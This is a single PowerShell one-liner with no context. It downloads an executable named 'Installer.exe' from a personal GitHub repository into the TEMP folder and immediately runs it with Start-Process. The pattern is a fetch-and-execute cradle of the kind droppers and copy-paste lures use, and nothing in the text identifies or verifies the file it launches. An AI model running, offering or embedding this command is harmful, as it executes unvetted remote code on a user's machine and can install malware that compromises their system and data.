$url="https://github.com/Bw11111/files/raw/refs/heads/main/Installer.exe"; $path="$env:TEMP\"+($url -split '/')[-1]; (New-Object Net.WebClient).DownloadFile($url,$path); Start-Process $path
